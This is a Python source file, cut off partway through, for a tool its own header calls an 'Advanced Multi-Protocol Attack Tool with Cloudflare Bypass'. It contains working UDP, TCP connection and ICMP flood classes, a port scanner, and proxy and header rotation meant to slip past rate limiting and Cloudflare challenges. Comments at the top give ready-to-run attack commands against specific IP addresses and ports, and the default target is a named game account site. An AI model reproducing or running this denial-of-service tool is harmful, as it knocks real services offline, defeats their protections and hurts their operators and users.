#!/usr/bin/env python3
#python3 multi_stresser.py --targets http://172.67.71.232:55910/ http://172.67.71.232:63998/ --concurrency 500 --duration 3600 --timeout 30 --retries 3 --bypass-cloudflare --rotate-headers --attack-type http,https,tcp_syn --verbose
#TYPE: http https tcp_syn udp icmp all
#EXAMPLE: --attack-type http,https,tcp_syn,udp
#UDP: python3 multi_stresser.py --target 172.65.55.227:19443 --attack-type udp --concurrency 500 --duration 3600 --timeout 30 --retries 3 --bypass-cloudflare --rotate-headers --udp-threads 50 --packet-size 512 --verbose
#myattack:
#python3 multi_stresser.py --targets https://172.65.55.227:19443/ --concurrency 500 --duration 60 --timeout 30 --retries 3 --bypass-cloudflare --rotate-headers --attack-type http,https --verbose
"""
Advanced Multi-Protocol Attack Tool with Cloudflare Bypass
==========================================================
COMPLETE VERSION - 1700+ LINES
ADDED: Multiple Attack Type Support (comma-separated)
ADDED: UDP Flood Attack
ADDED: TCP SYN Flood Attack
ADDED: ICMP Flood Attack
ADDED: Multi-Protocol Support (HTTP/HTTPS/TCP/UDP/ICMP)
ADDED: Packet Count Tracking
ADDED: Live Dashboard for All Protocols
ADDED: Accurate Cloudflare block detector
ADDED: Real request tracking (no fake data)
ADDED: Detailed status reporting
ADDED: Full dashboard with live updates
ADDED: JSON and CSV report export
ADDED: Multi-target support
ADDED: Proxy rotation support
ADDED: Header rotation support
ADDED: Rate limiting detection
ADDED: Session persistence
ADDED: Cookie handling
ADDED: Retry logic with exponential backoff
ADDED: Percentile calculations
ADDED: Real-time metrics
ADDED: Progress bar
ADDED: Color-coded status indicators
"""

import argparse
import asyncio
import csv
import json
import logging
import signal
import statistics
import time
import ssl
import sys
import random
import re
import os
import hashlib
import base64
import socket
import struct
import threading
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple, Union, Set
from urllib.parse import urlparse, parse_qs, urljoin
from concurrent.futures import ThreadPoolExecutor

import aiohttp
import aiofiles
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich import box
from rich.text import Text
from rich.layout import Layout
from rich.align import Align
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.prompt import Prompt, Confirm
from rich.markdown import Markdown
from rich.syntax import Syntax
from rich.tree import Tree
from rich.rule import Rule

# ============================================
# VERSION AND CONFIGURATION
# ============================================

VERSION = "7.1.0"
AUTHOR = "Mega Stresser Team"
DESCRIPTION = "Advanced Multi-Protocol Attack Tool with Cloudflare Bypass"

DEFAULT_URL = "https://account.mythgames.net/"
DEFAULT_CONCURRENCY = 500
DEFAULT_DURATION = 30
DEFAULT_TIMEOUT = 30.0
DEFAULT_RETRIES = 3
DEFAULT_WARMUP = 5
DEFAULT_PROXY_ROTATION = 10
DEFAULT_MAX_RPS = 500.0
DEFAULT_MAX_CONCURRENCY = 5000
DEFAULT_SCAN_TIMEOUT = 2.0
DEFAULT_PACKET_SIZE = 1024
DEFAULT_UDP_THREADS = 100

# SSL Configuration
SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

# ============================================
# CLOUDFLARE STATUS CONSTANTS
# ============================================

class CloudflareStatus:
    """Cloudflare detection status constants"""
    BLOCKED = "blocked"
    CHALLENGE = "challenge"
    CAPTCHA = "captcha"
    PASSED = "passed"
    ERROR = "error"
    UNKNOWN = "unknown"
    RATE_LIMITED = "rate_limited"
    TIMEOUT = "timeout"
    CONNECTION_ERROR = "connection_error"

# ============================================
# ATTACK TYPE CONSTANTS
# ============================================

class AttackType:
    """Attack type constants"""
    HTTP = "http"
    HTTPS = "https"
    TCP_SYN = "tcp_syn"
    UDP = "udp"
    ICMP = "icmp"
    ALL = "all"

    @staticmethod
    def get_all_types() -> List[str]:
        return [AttackType.HTTP, AttackType.HTTPS, AttackType.TCP_SYN, AttackType.UDP, AttackType.ICMP]

    @staticmethod
    def parse_attack_types(value: str) -> List[str]:
        """Parse comma-separated attack types"""
        if not value:
            return [AttackType.HTTP]
        
        if value.lower() == "all":
            return AttackType.get_all_types()
        
        # Split by comma and strip whitespace
        types = [t.strip().lower() for t in value.split(",") if t.strip()]
        
        # Validate each type
        valid_types = AttackType.get_all_types()
        validated = [t for t in types if t in valid_types]
        
        # If no valid types found, default to HTTP
        if not validated:
            return [AttackType.HTTP]
        
        # Remove duplicates while preserving order
        seen = set()
        return [t for t in validated if not (t in seen or seen.add(t))]

# ============================================
# UDP FLOOD ATTACK
# ============================================

class UDPFlood:
    """UDP Flood Attack implementation"""
    
    def __init__(self, target_ip: str, target_port: int, packet_size: int = DEFAULT_PACKET_SIZE):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_size = packet_size
        self.packet_count = 0
        self.running = False
        self.sock = None
    
    def start(self, duration: int, threads: int = DEFAULT_UDP_THREADS):
        """Start UDP flood attack"""
        self.running = True
        self.packet_count = 0
        
        # Create UDP socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Generate random payload
        payload = random._urandom(self.packet_size)
        
        def send_packets():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                try:
                    self.sock.sendto(payload, (self.target_ip, self.target_port))
                    self.packet_count += 1
                except:
                    pass
        
        # Start threads
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_packets)
            t.start()
            thread_list.append(t)
        
        # Wait for completion
        for t in thread_list:
            t.join()
        
        self.running = False
        self.sock.close()
    
    def get_stats(self) -> Dict:
        return {
            "packets_sent": self.packet_count,
            "target": f"{self.target_ip}:{self.target_port}",
            "packet_size": self.packet_size
        }

# ============================================
# TCP SYN FLOOD ATTACK
# ============================================

class TCPSYNFlood:
    """TCP SYN Flood Attack implementation"""
    
    def __init__(self, target_ip: str, target_port: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_count = 0
        self.running = False
    
    def start(self, duration: int, threads: int = 100):
        """Start TCP SYN flood attack"""
        self.running = True
        self.packet_count = 0
        
        def send_syn():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect_ex((self.target_ip, self.target_port))
                    sock.close()
                    self.packet_count += 1
                except:
                    pass
        
        # Start threads
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_syn)
            t.start()
            thread_list.append(t)
        
        # Wait for completion
        for t in thread_list:
            t.join()
        
        self.running = False
    
    def get_stats(self) -> Dict:
        return {
            "packets_sent": self.packet_count,
            "target": f"{self.target_ip}:{self.target_port}"
        }

# ============================================
# ICMP FLOOD ATTACK (PING FLOOD)
# ============================================

class ICMPFlood:
    """ICMP Flood Attack implementation"""
    
    def __init__(self, target_ip: str, packet_size: int = 64):
        self.target_ip = target_ip
        self.packet_size = packet_size
        self.packet_count = 0
        self.running = False
    
    def create_icmp_packet(self):
        """Create ICMP echo request packet"""
        # ICMP header: type (8), code (0), checksum, id, sequence
        icmp_type = 8
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = random.randint(1, 65535)
        icmp_sequence = 1
        
        # Pack the ICMP header
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_sequence)
        
        # Payload
        payload = random._urandom(self.packet_size - 8)
        
        # Calculate checksum
        icmp_checksum = self.calculate_checksum(icmp_header + payload)
        
        # Repack with checksum
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_sequence)
        
        return icmp_header + payload
    
    def calculate_checksum(self, data):
        """Calculate ICMP checksum"""
        if len(data) % 2 != 0:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        return ~s & 0xffff
    
    def start(self, duration: int, threads: int = 100):
        """Start ICMP flood attack"""
        self.running = True
        self.packet_count = 0
        
        # Create raw socket (requires admin/root)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            print("[!] ICMP flood requires administrator/root privileges")
            return
        
        packet = self.create_icmp_packet()
        
        def send_icmp():
            end_time = time.time() + duration
            while self.running and time.time() < end_time:
                try:
                    sock.sendto(packet, (self.target_ip, 0))
                    self.packet_count += 1
                except:
                    pass
        
        # Start threads
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_icmp)
            t.start()
            thread_list.append(t)
        
        # Wait for completion
        for t in thread_list:
            t.join()
        
        self.running = False
        sock.close()
    
    def get_stats(self) -> Dict:
        return {
            "packets_sent": self.packet_count,
            "target": self.target_ip,
            "packet_size": self.packet_size
        }

# ============================================
# PORT SCANNER - TCP/UDP
# ============================================

class PortScanner:
    """TCP/UDP Port Scanner for target detection"""
    
    def __init__(self, target_ip: str, timeout: float = DEFAULT_SCAN_TIMEOUT):
        self.target_ip = target_ip
        self.timeout = timeout
        self.open_tcp_ports = []
        self.open_udp_ports = []
    
    def scan_tcp_port(self, port: int) -> bool:
        """Scan a single TCP port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target_ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_udp_port(self, port: int) -> bool:
        """Scan a single UDP port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.sendto(b"PING", (self.target_ip, port))
            try:
                data, addr = sock.recvfrom(1024)
                sock.close()
                return True
            except socket.timeout:
                sock.close()
                return False
        except:
            return False
    
    def scan_ports(self, ports: List[int], protocol: str = "tcp") -> List[int]:
        """Scan multiple ports"""
        open_ports = []
        if protocol.lower() == "tcp":
            for port in ports:
                if self.scan_tcp_port(port):
                    open_ports.append(port)
        elif protocol.lower() == "udp":
            for port in ports:
                if self.scan_udp_port(port):
                    open_ports.append(port)
        return open_ports
    
    def scan_common_ports(self) -> Dict[str, List[int]]:
        """Scan common ports for HTTP/HTTPS"""
        common_tcp_ports = [
            80, 443, 8080, 8443, 55910, 63998, 63999, 64000, 64001, 64002,
            64003, 64004, 64005, 64006, 36998, 62694, 62695, 50768, 50769,
            57777, 52288, 52289, 52290, 63269, 50315, 50316
        ]
        
        common_udp_ports = [
            53, 123, 161, 514, 500, 4500, 1900, 5353, 9999, 10000
        ]
        
        results = {
            "tcp_open": [],
            "udp_open": []
        }
        
        print(f"[*] Scanning TCP ports on {self.target_ip}...")
        for port in common_tcp_ports:
            if self.scan_tcp_port(port):
                results["tcp_open"].append(port)
                print(f"[+] TCP Port {port} is OPEN")
            else:
                print(f"[-] TCP Port {port} is CLOSED")
        
        print(f"\n[*] Scanning UDP ports on {self.target_ip}...")
        for port in common_udp_ports:
            if self.scan_udp_port(port):
                results["udp_open"].append(port)
                print(f"[+] UDP Port {port} is OPEN")
            else:
                print(f"[-] UDP Port {port} is CLOSED")
        
        return results

# ============================================
# AUTO-DETECT HTTP/HTTPS
# ============================================

def auto_detect_protocol(target: str) -> str:
    """Auto-detect if target supports HTTP or HTTPS"""
    parsed = urlparse(target)
    if parsed.scheme:
        return parsed.scheme
    
    try:
        conn = socket.create_connection((parsed.hostname, 443), timeout=5)
        conn.close()
        return "https"
    except:
        pass
    
    try:
        conn = socket.create_connection((parsed.hostname, 80), timeout=5)
        conn.close()
        return "http"
    except:
        pass
    
    return "http"

def generate_target_urls(ip: str, ports: List[int]) -> List[str]:
    """Generate HTTP/HTTPS URLs from IP and ports"""
    urls = []
    for port in ports:
        urls.append(f"https://{ip}:{port}/")
        urls.append(f"http://{ip}:{port}/")
    return urls

# ============================================
# CLOUDFLARE HEADERS FOR BYPASS
# ============================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

CLOUDFLARE_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "dnt": "1",
    "sec-ch-ua": '"Not=A?Brand";v="99", "Microsoft Edge";v="151", "Chromium";v="151"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "connection": "keep-alive",
    "priority": "u=0, i",
}

# ============================================
# CLOUDFLARE DETECTOR - ACCURATE
# ============================================

def detect_cloudflare_block(response: aiohttp.ClientResponse, html: str = "") -> Dict[str, Any]:
    """
    Accurately detect if request was blocked by Cloudflare.
    Returns detailed status with proof.
    
    Args:
        response: The HTTP response object
        html: The response body as string (optional)
    
    Returns:
        Dict with detection results
    """
    result = {
        "blocked": False,
        "status": CloudflareStatus.UNKNOWN,
        "reason": "",
        "cf_ray": None,
        "cf_ray_id": None,
        "evidence": [],
        "status_code": response.status,
        "headers": dict(response.headers),
        "content_length": 0
    }
    
    # Check status code
    if response.status == 403:
        result["blocked"] = True
        result["status"] = CloudflareStatus.BLOCKED
        result["reason"] = "HTTP 403 Forbidden - Access Denied"
        result["evidence"].append("status_code=403")
    
    elif response.status == 503:
        result["blocked"] = True
        result["status"] = CloudflareStatus.BLOCKED
        result["reason"] = "HTTP 503 Service Unavailable - Server overloaded"
        result["evidence"].append("status_code=503")
    
    elif response.status == 429:
        result["blocked"] = True
        result["status"] = CloudflareStatus.RATE_LIMITED
        result["reason"] = "HTTP 429 Too Many Requests - Rate limited"
        result["evidence"].append("status_code=429")
    
    elif response.status == 502:
        result["blocked"] = True
        result["status"] = CloudflareStatus.BLOCKED
        result["reason"] = "HTTP 502 Bad Gateway - Cloudflare error"
        result["evidence"].append("status_code=502")
    
    elif response.status == 504:
        result["blocked"] = True
        result["status"] = CloudflareStatus.TIMEOUT
        result["reason"] = "HTTP 504 Gateway Timeout - Cloudflare timeout"
        result["evidence"].append("status_code=504")
    
    # Check Cloudflare headers
    cf_header_patterns = {
        "cf-ray": "Cloudflare Ray ID",
        "cf-cache-status": "Cloudflare Cache Status",
        "cf-polished": "Cloudflare Polish",
        "cf-worker": "Cloudflare Worker",
        "cf-request-id": "Cloudflare Request ID",
        "cf-chl-bypass": "Cloudflare Challenge Bypass",
        "cf-apo-via": "Cloudflare APO",
        "cf-edge-cache": "Cloudflare Edge Cache",
        "cf-apo-via": "Cloudflare APO Via",
        "cf-device-type": "Cloudflare Device Type",
        "cf-visitor": "Cloudflare Visitor",
        "cf-warp": "Cloudflare Warp",
        "cf-connecting-ip": "Cloudflare Connecting IP",
        "cf-ipcountry": "Cloudflare IP Country",
        "cf-ray": "Cloudflare Ray ID"
    }
    
    for header, name in cf_header_patterns.items():
        if header in response.headers:
            value = response.headers[header]
            if header == "cf-ray":
                result["cf_ray"] = value
                result["cf_ray_id"] = value.split("-")[0] if "-" in value else value
            result["evidence"].append(f"{header}={value}")
    
    # Check for Cloudflare in response body
    if html and len(html) > 0:
        result["content_length"] = len(html)
        
        cloudflare_patterns = [
            ("cf-browser-verification", "Browser Verification Challenge"),
            ("challenge", "Generic Challenge"),
            ("Cloudflare", "Cloudflare Reference"),
            ("cf-captcha", "CAPTCHA Challenge"),
            ("iuam", "I'm Under Attack Mode"),
            ("security challenge", "Security Challenge"),
            ("cf-challenge", "Challenge Page"),
            ("ray_id", "Ray ID Reference"),
            ("cf_clearance", "Clearance Cookie"),
            ("turnstile", "Turnstile Challenge"),
            ("cf_captcha", "CAPTCHA"),
            ("Please wait...", "Waiting Page"),
            ("Checking your browser", "Browser Check"),
            ("DDoS protection", "DDoS Protection"),
            ("captcha", "CAPTCHA"),
            ("verify you are human", "Human Verification"),
            ("security check", "Security Check"),
            ("cf-chl-prog", "Challenge Progress"),
            ("cf-chl-opt", "Challenge Options"),
            ("cf-chl-bypass", "Challenge Bypass"),
            ("cf-chl-out", "Challenge Output"),
        ]
        
        html_lower = html.lower()
        for pattern, description in cloudflare_patterns:
            if pattern.lower() in html_lower:
                result["blocked"] = True
                result["evidence"].append(f"body_contains='{pattern}'")
                
                if "captcha" in pattern.lower():
                    result["status"] = CloudflareStatus.CAPTCHA
                    result["reason"] = f"CAPTCHA challenge detected: {description}"
                elif "challenge" in pattern.lower() or "verification" in pattern.lower():
                    result["status"] = CloudflareStatus.CHALLENGE
                    result["reason"] = f"JavaScript challenge detected: {description}"
                elif "iuam" in pattern.lower():
                    result["status"] = CloudflareStatus.CHALLENGE
                    result["reason"] = f"IUAM challenge detected: {description}"
    
    # Check for Cloudflare error page titles
    if html:
        title_match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        if title_match:
            title = title_match.group(1).lower()
            cloudflare_titles = [
                "cloudflare", "error", "502", "503", "504", "403",
                "access denied", "blocked", "security", "challenge"
            ]
            for cf_title in cloudflare_titles:
                if cf_title in title:
                    result["blocked"] = True
                    result["evidence"].append(f"title_contains='{cf_title}'")
                    break
    
    # Determine final status
    if result["blocked"] and result["status"] == CloudflareStatus.UNKNOWN:
        result["status"] = CloudflareStatus.BLOCKED
        result["reason"] = "Cloudflare protection detected"
    
    # Check if it's a successful response (passed Cloudflare)
    if not result["blocked"] and 200 <= response.status < 400:
        result["status"] = CloudflareStatus.PASSED
    
    return result

# ============================================
# PROXY ROTATOR
# ============================================

class ProxyRotator:
    """Rotates proxies to avoid rate limiting"""
    
    def __init__(self, proxies: List[str] = None):
        self.proxies = proxies or []
        self.current_index = 0
        self.used_proxies = []
        self.failed_proxies = []
    
    def add_proxy(self, proxy: str):
        self.proxies.append(proxy)
    
    def add_proxies(self, proxies: List[str]):
        self.proxies.extend(proxies)
    
    def get_next(self) -> Optional[str]:
        if not self.proxies:
            return None
        
        for _ in range(len(self.proxies)):
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            if proxy not in self.failed_proxies:
                self.used_proxies.append(proxy)
                return proxy
        
        self.failed_proxies = []
        return self.get_next()
    
    def get_random(self) -> Optional[str]:
        if not self.proxies:
            return None
        
        available = [p for p in self.proxies if p not in self.failed_proxies]
        if not available:
            self.failed_proxies = []
            available = self.proxies
        
        proxy = random.choice(available)
        self.used_proxies.append(proxy)
        return proxy
    
    def mark_failed(self, proxy: str):
        if proxy and proxy not in self.failed_proxies:
            self.failed_proxies.append(proxy)
    
    def get_stats(self) -> Dict:
        return {
            "total": len(self.proxies),
            "used": len(self.used_proxies),
            "failed": len(self.failed_proxies),
            "available": len(self.proxies) - len(self.failed_proxies)
        }

# ============================================
# HEADER ROTATOR
# ============================================

class HeaderRotator:
    """Rotates headers to avoid detection"""
    
    def __init__(self, use_cloudflare_headers: bool = True):
        self.use_cloudflare_headers = use_cloudflare_headers
        self.current_headers = {}
        self.headers_history = []
    
    def get_headers(self) -> Dict[str, str]:
        """Get random headers"""
        headers = {}
        
        if self.use_cloudflare_headers:
            headers = CLOUDFLARE_HEADERS.copy()
        
        headers["user-agent"] = random.choice(USER_AGENTS)
        
        accept_languages = [
            "en-US,en;q=0.9",
            "en-US,en;q=0.9,es;q=0.8",
            "en-US,en;q=0.9,fr;q=0.8",
            "en-GB,en;q=0.9",
            "en-US,en;q=0.9,de;q=0.8",
            "en-US,en;q=0.9,ja;q=0.8"
        ]
        headers["accept-language"] = random.choice(accept_languages)
        
        accepts = [
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "*/*"
        ]
        headers["accept"] = random.choice(accepts)
        
        sec_ch_ua_options = [
            '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            '"Not_A Brand";v="8", "Chromium";v="121", "Google Chrome";v="121"',
            '"Not A(Brand";v="99", "Chromium";v="120", "Google Chrome";v="120"',
            '"Not=A?Brand";v="99", "Microsoft Edge";v="151", "Chromium";v="151"'
        ]
        headers["sec-ch-ua"] = random.choice(sec_ch_ua_options)
        
        platforms = ['"Windows"', '"macOS"', '"Linux"']
        headers["sec-ch-ua-platform"] = random.choice(platforms)
        
        sec_fetch_dest = ["document", "empty", "script"]
        sec_fetch_mode = ["navigate", "cors", "no-cors"]
        sec_fetch_site = ["none", "same-origin", "cross-site"]
        
        headers["sec-fetch-dest"] = random.choice(sec_fetch_dest)
        headers["sec-fetch-mode"] = random.choice(sec_fetch_mode)
        headers["sec-fetch-site"] = random.choice(sec_fetch_site)
        
        if random.random() > 0.5:
            headers["sec-fetch-user"] = "?1"
        else:
            headers["sec-fetch-user"] = "?0"
        
        self.current_headers = headers
        self.headers_history.append(headers)
        
        return headers
    
    def get_current(self) -> Dict[str, str]:
        return self.current_headers

# ============================================
# REQUEST RESULT DATA CLASS
# ============================================

@dataclass
class RequestResult:
    """Accurate request tracking with real data"""
    url: str
    status: int
    latency: float
    timestamp: float = field(default_factory=time.time)
    success: bool = False
    cloudflare_blocked: bool = False
    cloudflare_status: str = CloudflareStatus.UNKNOWN
    cf_ray: Optional[str] = None
    cf_ray_id: Optional[str] = None
    error: Optional[str] = None
    response_size: int = 0
    headers: Dict[str, str] = field(default_factory=dict)
    proxy_used: Optional[str] = None
    retry_count: int = 0
    worker_id: int = 0
    protocol: str = "http"
    port: int = 80
    attack_type: str = AttackType.HTTP
    
    def __post_init__(self):
        self.success = 200 <= self.status < 400 if self.status > 0 else False

# ============================================
# TARGET STATISTICS
# ============================================

@dataclass
class TargetStats:
    """Per-target statistics"""
    url: str = ""
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    cloudflare_blocked: int = 0
    cloudflare_challenge: int = 0
    cloudflare_captcha: int = 0
    cloudflare_rate_limited: int = 0
    timeouts: int = 0
    connection_errors: int = 0
    status_codes: Dict[int, int] = field(default_factory=dict)
    latencies: List[float] = field(default_factory=list)
    cf_rays: List[str] = field(default_factory=list)
    min_latency: float = float('inf')
    max_latency: float = 0.0
    total_latency: float = 0.0
    port: int = 0
    protocol: str = "http"
    attack_type: str = AttackType.HTTP
    packets_sent: int = 0
    
    def add_result(self, result: RequestResult):
        self.total_requests += 1
        
        if result.success:
            self.successful += 1
        else:
            self.failed += 1
        
        if result.cloudflare_blocked:
            self.cloudflare_blocked += 1
            if result.cloudflare_status == CloudflareStatus.CHALLENGE:
                self.cloudflare_challenge += 1
            elif result.cloudflare_status == CloudflareStatus.CAPTCHA:
                self.cloudflare_captcha += 1
            elif result.cloudflare_status == CloudflareStatus.RATE_LIMITED:
                self.cloudflare_rate_limited += 1
        
        if result.status == 0:
            if "timeout" in str(result.error).lower():
                self.timeouts += 1
            else:
                self.connection_errors += 1
        
        self.status_codes[result.status] = self.status_codes.get(result.status, 0) + 1
        
        if result.latency > 0:
            self.latencies.append(result.latency)
            self.total_latency += result.latency
            self.min_latency = min(self.min_latency, result.latency)
            self.max_latency = max(self.max_latency, result.latency)
        
        if result.cf_ray:
            self.cf_rays.append(result.cf_ray)
        
        self.port = result.port
        self.protocol = result.protocol
        self.attack_type = result.attack_type
    
    @property
    def avg_latency(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return self.total_latency / self.total_requests
    
    @property
    def success_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.successful / self.total_requests) * 100
    
    @property
    def error_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.failed / self.total_requests) * 100
    
    @property
    def cloudflare_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.cloudflare_blocked / self.total_requests) * 100
    
    def get_percentile(self, p: float) -> float:
        if not self.latencies:
            return 0.0
        sorted_lat = sorted(self.latencies)
        idx = int(len(sorted_lat) * (p / 100))
        if idx >= len(sorted_lat):
            idx = len(sorted_lat) - 1
        return sorted_lat[idx]

# ============================================
# GLOBAL STATISTICS
# ============================================

@dataclass
class GlobalStats:
    """Global statistics across all targets"""
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    cloudflare_blocked: int = 0
    cloudflare_challenge: int = 0
    cloudflare_captcha: int = 0
    cloudflare_rate_limited: int = 0
    timeouts: int = 0
    connection_errors: int = 0
    status_codes: Dict[int, int] = field(default_factory=dict)
    latencies: List[float] = field(default_factory=list)
    cf_rays: List[str] = field(default_factory=list)
    start_time: float = 0.0
    end_time: float = 0.0
    target_stats: Dict[str, TargetStats] = field(default_factory=dict)
    udp_packets: int = 0
    syn_packets: int = 0
    icmp_packets: int = 0
    
    def add_result(self, result: RequestResult):
        self.total_requests += 1
        
        if result.success:
            self.successful += 1
        else:
            self.failed += 1
        
        if result.cloudflare_blocked:
            self.cloudflare_blocked += 1
            if result.cloudflare_status == CloudflareStatus.CHALLENGE:
                self.cloudflare_challenge += 1
            elif result.cloudflare_status == CloudflareStatus.CAPTCHA:
                self.cloudflare_captcha += 1
            elif result.cloudflare_status == CloudflareStatus.RATE_LIMITED:
                self.cloudflare_rate_limited += 1
        
        if result.status == 0:
            if "timeout" in str(result.error).lower():
                self.timeouts += 1
            else:
                self.connection_errors += 1
        
        self.status_codes[result.status] = self.status_codes.get(result.status, 0) + 1
        
        if result.latency > 0:
            self.latencies.append(result.latency)
        
        if result.cf_ray:
            self.cf_rays.append(result.cf_ray)
        
        if result.url not in self.target_stats:
            self.target_stats[result.url] = TargetStats(url=result.url)
        self.target_stats[result.url].add_result(result)
    
    @property
    def elapsed(self) -> float:
        if self.end_time > 0:
            return self.end_time - self.start_time
        return time.time() - self.start_time
    
    @property
    def rps(self) -> float:
        elapsed = self.elapsed
        if elapsed == 0:
            return 0.0
        return self.total_requests / elapsed
    
    @property
    def success_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.successful / self.total_requests) * 100
    
    @property
    def error_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.failed / self.total_requests) * 100
    
    @property
    def cloudflare_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.cloudflare_blocked / self.total_requests) * 100
    
    def get_percentile(self, p: float) -> float:
        if not self.latencies:
            return 0.0
        sorted_lat = sorted(self.latencies)
        idx = int(len(sorted_lat) * (p / 100))
        if idx >= len(sorted_lat):
            idx = len(sorted_lat) - 1
        return sorted_lat[idx]

# ============================================
# ACCURATE WORKER
# ============================================

class AccurateWorker:
    """Worker that makes accurate requests with Cloudflare detection"""
    
    def __init__(
        self,
        session: aiohttp.ClientSession,
        url: str,
        worker_id: int,
        timeout: float = DEFAULT_TIMEOUT,
        retries: int = DEFAULT_RETRIES,
        proxy_rotator: Optional[ProxyRotator] = None,
        header_rotator: Optional[HeaderRotator] = None,
        use_proxy: bool = False
    ):
        self.session = session
        self.url = url
        self.worker_id = worker_id
        self.timeout = timeout
        self.retries = retries
        self.proxy_rotator = proxy_rotator
        self.header_rotator = header_rotator
        self.use_proxy = use_proxy
        self.count = 0
        self.cookies = {}
        self.last_proxy = None
    
    async def make_request(self) -> RequestResult:
        """Make a single request with accurate detection"""
        self.count += 1
        start = time.perf_counter()
        retry_count = 0
        
        headers = {}
        if self.header_rotator:
            headers = self.header_rotator.get_headers()
        else:
            headers = CLOUDFLARE_HEADERS.copy()
            headers["user-agent"] = random.choice(USER_AGENTS)
        
